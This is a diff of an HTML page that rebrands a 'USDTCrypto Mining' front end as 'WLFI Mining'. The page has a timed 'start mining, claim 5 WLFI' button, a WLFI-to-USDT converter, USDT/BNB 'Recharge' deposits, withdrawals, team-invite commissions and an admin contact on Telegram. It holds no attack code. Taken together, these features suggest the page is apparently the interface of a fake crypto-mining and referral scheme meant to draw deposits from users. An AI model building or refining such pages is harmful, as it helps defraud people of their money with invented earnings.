@@ -1,45 +1,79 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDTCrypto Mining - Live</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WLFI Mining — Live</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
-    <img src="logo.png" class="logo" alt="USDTCrypto Logo" />
+  <div class="app">
+    <header class="topbar">
+      <div class="brand">WLFI Mining</div>
+      <div class="profile">User • Level 0</div>
+    </header>
 
-    <h2>🚀 Welcome to <span style="color:#00ff99;">USDTCrypto Mining</span></h2>
-    <p>Earn rewards automatically — mining live 24/7!</p>
+    <main class="content">
+      <section id="page-mine" class="page active">
+        <div class="card balance-card">
+          <div class="left">
+            <div class="coin-label">WLFI</div>
+            <div class="coin-amount" id="wlfiAmount">0.00</div>
+          </div>
+          <div class="right">
+            <div class="progress-bar"><div id="progressInner"></div></div>
+            <div class="progress-timer" id="progressTimer">—</div>
+          </div>
+        </div>
 
-    <div class="balance-box">
-      💰 Your Balance: <span id="balance">0.0000</span> USDT
-    </div>
+        <div class="card mine-card">
+          <h3>Mining Center</h3>
+          <p class="muted">Start mining — wait 24 hours — claim 5 WLFI.</p>
+          <div class="mine-controls">
+            <div id="mineStatus" class="mine-status">Not started</div>
+            <button id="mineActionBtn" class="btn primary">Start Mining</button>
+            <div id="mineMessage" class="muted" style="margin-top:8px"></div>
+          </div>
+        </div>
+      </section>
 
-    <div class="timer-box">
-      ⏱️ Mining Time Left: <span id="timer">24:00:00</span>
-    </div>
+      <section id="page-team" class="page">
+        <div class="card">
+          <h3>Team & Invite</h3>
+          <p>Invite friends and grow your team!</p>
+          <div class="invite-row">
+            <input id="refLink" readonly value="https://t.me/free_ton74" />
+            <button id="copyRefBtn" class="btn">Copy</button>
+          </div>
+          <div class="team-stats">
+            <div>Total team: <strong id="teamCount">0</strong></div>
+            <div>Commission: <strong id="teamCommission">$0</strong></div>
+          </div>
+        </div>
+      </section>
 
-    <button id="mineBtn" onclick="startMining()">Start Mining</button>
-    <button id="claimBtn" onclick="claimReward()" disabled>Claim Reward</button>
+      <section id="page-me" class="page">
+        <div class="card">
+          <h3>Profile & Wallet</h3>
+          <div class="me-grid">
+            <div>WLFI: <strong id="meWLFI">0.00</strong></div>
+            <div>USDT: <strong id="meUSDT">0.00</strong></div>
+          </div>
 
-    <h3>💹 Convert WLFIs → USDT</h3>
-    <div class="convert-box">
-      <input type="number" id="coinInput" placeholder="Enter WLFI amount" />
-      <button onclick="convertToUSDT()">Convert</button>
-    </div>
+          <div class="me-actions">
+            <button id="openConvert" class="btn">Convert WLFI → USDT</button>
+            <button id="openRecharge" class="btn">Recharge (USDT / BNB)</button>
+            <button id="openWithdraw" class="btn">Withdraw</button>
+          </div>
+        </div>
+      </section>
+    </main>
 
-    <h3>💳 Withdraw Funds</h3>
-    <button onclick="withdraw('binance')">Withdraw via Binance</button>
-    <button onclick="withdraw('bitget')">Withdraw via Bitget</button>
-
-    <div class="footer">
-      <p style="color:#00ff88; font-weight:bold;">🔥 Live Mining System Active 💥</p>
-      <p>Need help? Contact admin via Telegram: 
-        <a href="https://t.me/free_ton74" target="_blank" style="color:#00ccff;">@free_ton74</a>
-      </p>
-    </div>
+    <nav class="bottom-nav">
+      <button class="nav-btn active" data-target="page-mine">Mine</button>
+      <button class="nav-btn" data-target="page-team">Team</button>
+      <button class="nav-btn" data-target="page-me">Me</button>
+    </nav>
   </div>
 
   <script src="script.js"></script>
